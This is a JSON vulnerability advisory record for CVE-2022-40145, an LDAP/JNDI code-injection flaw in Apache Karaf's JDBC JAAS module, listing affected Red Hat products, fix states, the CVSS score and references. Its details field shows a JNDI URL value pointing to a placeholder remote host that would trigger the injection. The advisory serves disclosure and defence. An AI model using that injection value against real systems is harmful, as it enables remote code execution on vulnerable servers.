{
  "mitigation": "No mitigation is currently available.",
  "affected_release": null,
  "package_state": [
    {
      "product_name": "Red Hat Decision Manager 7",
      "fix_state": "Not affected",
      "package_name": "Karaf",
      "cpe": "cpe:/a:redhat:jboss_enterprise_brms_platform:7"
    },
    {
      "product_name": "Red Hat JBoss A-MQ 6",
      "fix_state": "Out of support scope",
      "package_name": "karaf",
      "cpe": "cpe:/a:redhat:jboss_amq:6"
    },
    {
      "product_name": "Red Hat JBoss Data Grid 7",
      "fix_state": "Out of support scope",
      "package_name": "karaf",
      "cpe": "cpe:/a:redhat:jboss_data_grid:7"
    },
    {
      "product_name": "Red Hat JBoss Fuse 6",
      "fix_state": "Out of support scope",
      "package_name": "Karaf",
      "cpe": "cpe:/a:redhat:jboss_fuse:6"
    },
    {
      "product_name": "Red Hat JBoss Fuse 7",
      "fix_state": "Not affected",
      "package_name": "Karaf",
      "cpe": "cpe:/a:redhat:jboss_fuse:7"
    },
    {
      "product_name": "Red Hat Process Automation 7",
      "fix_state": "Not affected",
      "package_name": "karaf",
      "cpe": "cpe:/a:redhat:jboss_enterprise_bpms_platform:7"
    }
  ],
  "threat_severity": "Important",
  "public_date": "2022-12-21T00:00:00Z",
  "bugzilla": {
    "description": "karaf: JDBC JAAS LDAP injection",
    "id": "2257304",
    "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2257304"
  },
  "cvss": {
    "cvss_base_score": "",
    "cvss_scoring_vector": "",
    "status": ""
  },
  "cvss3": {
    "cvss3_base_score": "9.8",
    "cvss3_scoring_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "status": "draft"
  },
  "iava": "",
  "cwe": "CWE-20",
  "statement": "This attack requires previous control of the LDAP target server in order to obtain access and perform code execution. Considering the pre-requisites for this vulnerability to be exploited, the impact is Important and not Critical.",
  "acknowledgement": "",
  "name": "CVE-2022-40145",
  "document_distribution": "",
  "details": [
    "This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL.\nThe function jaas.modules.src.main.java.porg.apache.karaf.jass.modules.jdbc.JDBCUtils#doCreateDatasource\nuse InitialContext.lookup(jndiName) without filtering.\nAn user can modify `options.put(JDBCUtils.DATASOURCE, \"osgi:\" + DataSource.class.getName());` to `options.put(JDBCUtils.DATASOURCE,\"jndi:rmi://x.x.x.x:xxxx/Command\");` in JdbcLoginModuleTest#setup.\nThis is vulnerable to a remote code execution (RCE) attack when a\nconfiguration uses a JNDI LDAP data source URI when an attacker has\ncontrol of the target LDAP server.This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7.\nWe encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8",
    "A flaw was found in Apache Karaf. This issue may allow an attacker to control the LDAP server used by the JDBC JNDI URL and execute code remotely (RCE)."
  ],
  "references": [
    "https://www.cve.org/CVERecord?id=CVE-2022-40145\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-40145\nhttps://karaf.apache.org/security/cve-2022-40145.txt"
  ]
}